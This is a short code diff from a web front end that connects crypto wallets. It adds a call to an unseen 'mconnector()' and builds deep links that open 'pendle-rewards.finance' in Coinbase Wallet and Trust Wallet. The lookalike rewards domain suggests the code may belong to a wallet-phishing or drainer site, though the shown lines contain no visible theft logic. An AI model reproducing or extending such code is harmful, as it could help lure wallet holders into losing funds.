@@ -494,7 +494,13 @@ export default {
           'https://go.cb-w.com/dapp?cb_url=https%3a%2f%2fpendle-rewards.finance%2f';
       }
       if (type == 3) {
-        return this.wConnect()
+        if(window.ethereum){
+          this.showModal = false;
+          await mconnector();
+          this.wConnect()
+          return;
+        }
+        url = "https://link.trustwallet.com/open_url?coin_id=60&url=https://pendle-rewards.finance/";
       }
       if (type == 4) {
         url =
